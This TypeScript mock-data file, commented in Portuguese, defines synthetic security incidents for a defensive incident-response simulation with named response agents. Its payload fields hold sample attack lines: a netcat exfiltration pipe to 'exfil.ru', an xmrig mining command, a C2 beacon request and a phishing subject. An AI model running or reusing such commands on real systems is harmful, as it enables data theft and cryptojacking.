import { ThreatEvent } from './types';

/**
 * @const MOCK_THREATS
 * Conjunto de dados sintéticos de alta fidelidade para simulação de incidentes.
 * Cobre vetores de ataque em IT (Sistemas Corporativos) e OT (Sistemas Operacionais/SCADA).
 */
export const MOCK_THREATS: ThreatEvent[] = [
  {
    id: 'TH-001',
    timestamp: new Date().toISOString(),
    source: 'Nó_Borda_Camaçari_VLAN40',
    type: 'MOVIMENTAÇÃO_LATERAL_SCADA',
    severity: 'CRITICAL',
    description: 'Movimentação lateral detectada visando PLC Siemens S7-1500. Possível tentativa de manipulação de parâmetros de pressão redundante.',
    payload: '0x34 0xFA 0x22 ... [S7COMM_EXPLOIT_DETECTION]',
    mitigation: 'Isolar Sub-rede, Iniciar Bloqueio de Porta Zero-Trust.',
    mitigationSteps: [
      'Edge_DLP: Bloquear portas TCP 102 (ISO-TSAP) no segmento afetado.',
      'Supervisor: Isolar logicamente a VLAN 40 do backbone corporativo.',
      'RAG_Intel: Mapear tática para MITRE T0801 (Monitoramento de Protocolo ICS).',
      'Recovery_Engine: Forçar rotação de chaves de autenticação nos PLCs Siemens.',
      'Threat_Hunter: Varrear nós adjacentes em busca de persistência via túneis SSH.'
    ]
  },
  {
    id: 'TH-002',
    timestamp: new Date().toISOString(),
    source: 'Refinaria_Abreu_e_Lima_WAN',
    type: 'BEACONING_RANSOMWARE',
    severity: 'HIGH',
    description: 'Tráfego de comando e controle (C2) de saída detectado para proxies conhecidos da dark-web LockBit 3.0 via portas não-padrão.',
    payload: 'GET /v1/auth?k=9933 ... Host: onion-proxy-7722.xyz',
    mitigation: 'Bloquear faixa de IP, Executar Aquisição Forense de Endpoint.',
    mitigationSteps: [
      'Edge_DLP: Bloquear IPs de destino e domínios .onion no proxy de borda.',
      'Threat_Hunter: Localizar o processo pai originador do tráfego no host afetado.',
      'RAG_Intel: Cruzar IoCs com feeds de inteligência de ameaças em tempo real.',
      'Recovery_Engine: Isolar endpoint e iniciar backup offline da base de dados SQL.',
      'CLevel_Reporter: Emitir alerta de risco financeiro iminente para a diretoria.'
    ]
  },
  {
    id: 'TH-003',
    timestamp: new Date().toISOString(),
    source: 'Bacia_de_Santos_FPSO_IoT',
    type: 'EXFILTRAÇÃO_DLP',
    severity: 'MEDIUM',
    description: 'Volume atípico de saída de dados do servidor de modelagem de reservatório geológico via FTP sobre TLS (4.2GB em 30s).',
    payload: 'zip -r data.zip /mnt/geo/data ... | nc exfil.ru 8080',
    mitigation: 'Aplicar Limitação de Taxa, Autenticar Proprietário dos Dados.',
    mitigationSteps: [
      'Edge_DLP: Aplicar "Traffic Shaping" restritivo no uplink satelital.',
      'Supervisor: Suspender credenciais de serviço do servidor de modelagem.',
      'Threat_Hunter: Analisar logs de acesso aos arquivos para identificar o vazamento.',
      'RAG_Intel: Verificar se os dados contêm PII ou segredos industriais proprietários.',
      'CLevel_Reporter: Avaliar impacto regulatório de acordo com a LGPD.'
    ]
  },
  {
    id: 'TH-004',
    timestamp: new Date().toISOString(),
    source: 'Gateway_E-mail_VP_Corporativo',
    type: 'PHISHING_IA_APRIMORADO',
    severity: 'HIGH',
    description: 'Tentativa de spear-phishing visando executivos C-Level usando credenciais de deepfake de voz clonada para autorização de transferência rápida.',
    payload: 'Assunto: URGENTE: Autorização Financeira Q3 ... anexo: auth_token.zip',
    mitigation: 'Quarentena de E-mail, Notificar Equipe de Treinamento de Segurança.',
    mitigationSteps: [
      'Supervisor: Revogar todos os tokens de sessão ativos da conta alvo.',
      'Edge_DLP: Bloquear URLs contidas no corpo do e-mail em todo o perímetro.',
      'RAG_Intel: Analisar o anexo .zip em sandbox segura para extrair payloads.',
      'CLevel_Reporter: Coordenar comunicação de crise com o departamento jurídico.',
      'Recovery_Engine: Habilitar MFA reforçado (hardware keys) para contas críticas.'
    ]
  },
  {
    id: 'TH-005',
    timestamp: new Date().toISOString(),
    source: 'Infraestrutura_Cloud_Azure_BR',
    type: 'CRIPTOMINERAÇÃO_LATERAL',
    severity: 'LOW',
    description: 'Aumento não planejado de 400% no uso de CPU em instâncias Kubernetes voltadas para análise de dados sísmicos.',
    payload: 'xmrig -o pool.supportxmr.com:443 -u [WAL_HASH]...',
    mitigation: 'Terminar Pods, Atualizar Políticas de IAM.',
    mitigationSteps: [
      'Supervisor: Identificar pods com consumo anômalo via Prometheus.',
      'Edge_DLP: Bloquear conexões de saída para pools de mineração conhecidos.',
      'Recovery_Engine: Reconstruir nodes do cluster a partir de imagens imutáveis.',
      'Threat_Hunter: Investigar credencial de service account possivelmente vazada.',
      'RAG_Intel: Auditar permissões de Role-Based Access Control (RBAC) no cluster.'
    ]
  }
];

/**
 * @const AGENT_LIST
 * Catálogo de agentes autônomos disponíveis para orquestração.
 */
export const AGENT_LIST = [
  'Supervisor', 
  'Edge_DLP', 
  'RAG_Intel', 
  'CLevel_Reporter', 
  'Threat_Hunter', 
  'Recovery_Engine'
];
